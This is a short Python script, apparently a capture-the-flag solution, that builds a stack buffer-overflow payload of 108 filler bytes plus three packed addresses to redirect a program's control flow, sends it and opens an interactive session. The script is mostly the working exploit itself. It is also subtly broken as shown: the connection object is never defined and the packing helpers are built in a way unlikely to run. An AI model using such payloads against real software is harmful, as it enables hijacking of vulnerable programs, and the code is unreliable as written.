from _struct import Struct
s = Struct.__new__(Struct)
s.format = "<I"
s.size = 4

def p32(x):
  return s.pack(x)

def u32(x):
  return s.unpack(x)[0]

payload = "A"*108 + p32(0x0804862a) + p32(0x0804b0a0) + p32(0x0804b0a0)

p.sendline(payload)

p.interactive()
